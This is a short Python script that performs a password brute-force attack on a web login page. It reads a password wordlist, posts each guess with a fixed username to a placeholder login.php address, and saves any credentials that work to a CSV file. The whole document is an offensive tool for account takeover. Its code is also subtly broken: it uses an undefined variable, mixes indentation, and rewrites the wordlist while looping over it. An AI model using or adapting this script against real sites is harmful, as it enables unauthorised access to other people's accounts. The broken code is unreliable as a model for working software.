import sys
import requests

def send_request(target, username, password):
	sys.stdout.write("\r\t\t\t\t\t\t\t")
	sys.stdout.flush()
	sys.stdout.write("\r[!] Testing username and password: " + username + "|" + password)
	sys.stdout.flush()
	if requests.post(target, { "username": username, "password": password }).json()["result"] == "success":
		sys.stdout.write("\r\t\t\t\t\t\t\t")
		sys.stdout.flush()
		print("\r[+] Login: %s\n[+] Password: %s\n" % (username, password))
		open("saves.csv", "a").write(username + "," + password + "\n")

def remove_first_line(filename):
	passwordList = open(filename, "r").readlines()[1:]
	open(filename, "w").writelines(passwordList)

filename = "passwords.txt"
for i in open(filename, "r"):
    send_request("http://.../login.php", "username", password)
	remove_first_line(filename)